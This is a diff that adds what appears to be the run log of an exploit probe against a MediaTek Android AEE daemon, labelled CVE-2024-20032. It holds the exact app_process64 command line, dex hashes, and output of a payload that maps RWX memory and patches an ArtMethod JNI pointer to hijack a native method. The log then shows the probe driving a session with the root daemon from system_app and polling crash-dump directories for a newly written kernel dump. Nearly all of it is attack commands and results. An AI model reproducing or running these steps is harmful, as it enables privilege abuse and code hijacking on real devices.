@@ -1,0 +1,53 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex app_process64 /system/bin AeeSessionProbe --socket=com.mtk.aee.aed_64 --ind=11 --class=0 --flags=aee00000 --payload --max-reqs=20
+probe=aee-session
+dex_md5=363c8cdebf4efed42d1f9aa475b52d07
+dex_sha256=bfdf6200555bd2791d49e017b5e5cabb826346295253c77fdd40a4fddf00a306
+remote_dex=/data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+363c8cdebf4efed42d1f9aa475b52d07  /data/data/com.android.settings/cache/apusys_ioctl_probe.dex
+[AeeSessionProbe] CVE-2024-20032 session driver
+[AeeSessionProbe] uid=1000 pid=12468 target_pid=12468 class=0 ind=11 flags=0xaee00000 payload=true
+[+] Scratch buffer at 0x7728400000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x77259ef000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x771f5e0c88
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7466e1a2c0
+    entry_point    = 0x10380008064bc588
+[*] Patching data_ (JNI) → 0x77259ef000
+    data_       = 0x77259ef000 ✓
+    entry_point = 0x10380008064bc588 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[session] @com.mtk.aee.aed_64 connected peer_uid=0
+[session] IND ind=11 class=0 pid=12468 flags=0xaee00000 payload=14
+[session] IND bytes: 02 00 00 00 0b 00 00 00 b4 30 00 00 00 00 00 00 0e 00 00 00 00 00 e0 ae
+[session] REQ#0 type=0 cmd=2(REQ_TYPE) seq=0 payload=0
+[session] REQ#1 type=0 cmd=3(REQ_PROCESS) seq=1 payload=0
+[session] REQ#2 type=0 cmd=4(REQ_MODULE) seq=2 payload=0
+[session] REQ#3 type=0 cmd=43(REQ_TRIG_TIME) seq=3 payload=0
+[session] REQ#4 type=0 cmd=5(REQ_BACKTRACE) seq=4 payload=0
+[session] REQ#5 type=2 cmd=16(IND_LOG_CLOSE) seq=0 payload=0
+[session] daemon IND cmd=16(IND_LOG_CLOSE) — session CLOSED
+[session] *** SUCCESS: 5 REQ/RSP exchanges on @com.mtk.aee.aed_64 ***
+[result] CVE_2024_20032=CONFIRMED — system_app drove full session with root aee daemon
+
+[phase-check] AEE artifact candidates
+[dump_check] 开始轮询转储目录（最多45秒）...
+[dump_check] /data/aee_exp (system_app-readable AEE exp): 12 个已有条目
+[dump_check] /data/vendor/aee_exp (vendor AEE exp; platform_app-readable, usually system_app-blocked): 0 个已有条目
+[dump_check] /data/vendor/core (vendor core; usually system_app-blocked): 0 个已有条目
+[dump_check] /data/vendor/dumpsys (vendor dumpsys; usually system_app-blocked): 0 个已有条目
+[dump_check] /data/tombstones (tombstones): 0 个已有条目
+[dump_check] /data/anr (ANR traces): 9 个已有条目
+[dump_check] ★★★ 新文件: /data/aee_exp/db.fatal.01.KE  age=1s
+[dump_check]   └─ db.fatal.01.KE.dbg  (2352884B)
+[dump_check]   └─ ZZ_INTERNAL  (113B)
+[dump_check]   └─ BUILD_INFO  (178B)
+[result] DUMP_WRITTEN=YES ★ aee_dumpstate 写入了转储文件！
